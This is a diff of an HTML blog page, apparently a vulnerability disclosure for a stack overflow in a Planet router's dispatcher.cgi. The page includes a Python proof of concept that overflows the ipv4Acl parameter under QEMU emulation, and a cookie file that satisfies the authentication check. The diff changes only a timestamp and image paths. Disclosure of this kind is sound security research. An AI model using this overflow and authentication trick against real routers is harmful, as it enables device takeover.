@@ -30,7 +30,7 @@
 <meta property="og:image" content="https://lafdrew.github.io/res/image-20250416152851713-174478853300914.png">
 <meta property="og:image" content="https://lafdrew.github.io/res/image-20250416152949388-174478859218115.png">
 <meta property="article:published_time" content="2025-04-18T07:32:49.000Z">
-<meta property="article:modified_time" content="2025-04-20T09:23:18.258Z">
+<meta property="article:modified_time" content="2025-04-20T11:25:03.936Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="cve">
 <meta name="twitter:card" content="summary_large_image">
@@ -275,21 +275,21 @@
                 <h1 id="web-acl-ipv4BasedAceAdd-post-ipv4Acl"><a href="#web-acl-ipv4BasedAceAdd-post-ipv4Acl" class="headerlink" title="web_acl_ipv4BasedAceAdd_post-ipv4Acl"></a>web_acl_ipv4BasedAceAdd_post-ipv4Acl</h1><p>During my internship at Qi An Xin Tiangong Lab, I discovered a  stack overflow vulnerability in the Planet router.</p>
 <p>By analyzing the dispatcher file in the bin directory, I found that the function web_acl_ipv4BasedAceAdd  contains a stack overflow vulnerability.</p>
 <p>The stack overflow can be triggered by ipv4Aclkey value, which leads to a strcpy stack overflow.</p>
-<p><img src="/res/202503211522484-174514063849415.png" srcset="/img/loading.gif" lazyload alt="image-20250321152223389"></p>
+<p><img src="/../res/202503211522484-174514063849415.png" srcset="/img/loading.gif" lazyload alt="image-20250321152223389"></p>
 <p>In the main function, there is an account authentication detection. We create a cookie_0 in the tmp directory, with the content of “20 0 0”, and its function is to create a cookie with sufficient permissions to access this route.</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-number">20</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
 
 
 
-<p><img src="/res/image-20250416151600679-17447880314529.png" srcset="/img/loading.gif" lazyload alt="image-20250416151600679"></p>
+<p><img src="/../res/image-20250416151600679-17447880314529.png" srcset="/img/loading.gif" lazyload alt="image-20250416151600679"></p>
 <p>﻿The content of the <strong>poc</strong>.py file is as follows:</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs json">import os<br><br><br>a = <span class="hljs-number">0xC0E</span><br>var_name = <span class="hljs-string">&quot;ipv4Acl&quot;</span><br>b = &#x27;a&#x27; * <span class="hljs-number">0x300</span><br><br>poc_content = f<span class="hljs-string">&quot;&amp;cmd=&#123;a&#125;&amp;&#123;var_name&#125;=&#123;b&#125;&quot;</span><br>with open(&#x27;poc&#x27;<span class="hljs-punctuation">,</span> &#x27;w&#x27;) as f<span class="hljs-punctuation">:</span><br>    f.write(poc_content)<br><br><br>command = (<br>    <span class="hljs-string">&quot;sudo chroot . ./qemu-mips-static &quot;</span><br>    <span class="hljs-string">&quot;-E REQUEST_METHOD=POST &quot;</span><br>    <span class="hljs-string">&quot;-E HTTP_COOKIE=&#x27;hid=0&#x27; &quot;</span><br>    <span class="hljs-string">&quot;-L ./lib &quot;</span><br>    <span class="hljs-string">&quot;-g 1234 &quot;</span><br>    <span class="hljs-string">&quot;./dispatcher.cgi &quot;</span><br>    <span class="hljs-string">&quot;&lt; poc&quot;</span>  <br>)<br><br><br>os.system(command)<br><br><br></code></pre></td></tr></table></figure>
 
 <p><img src="/res/image-20250416151814991-174478804293910.png" srcset="/img/loading.gif" lazyload alt="image-20250416151814991"></p>
 <p>Through IDA, it can be seen that the stack space is 0xb0.</p>
-<p><img src="/res/image-20250416152336647-174478821841413.png" srcset="/img/loading.gif" lazyload alt="image-20250416152336647"></p>
-<p><img src="/res/image-20250416152851713-174478853300914.png" srcset="/img/loading.gif" lazyload alt="image-20250416152851713"></p>
-<p><img src="/res/image-20250416152949388-174478859218115.png" srcset="/img/loading.gif" lazyload alt="image-20250416152949388"></p>
+<p><img src="/../res/image-20250416152336647-174478821841413.png" srcset="/img/loading.gif" lazyload alt="image-20250416152336647"></p>
+<p><img src="/../res/image-20250416152851713-174478853300914.png" srcset="/img/loading.gif" lazyload alt="image-20250416152851713"></p>
+<p><img src="/../res/image-20250416152949388-174478859218115.png" srcset="/img/loading.gif" lazyload alt="image-20250416152949388"></p>
 <p>Through the above image, we can see that we have overflowed to 0x318 and successfully hijacked the control flow. If necessary, more can be overflowed.</p>
 
                 
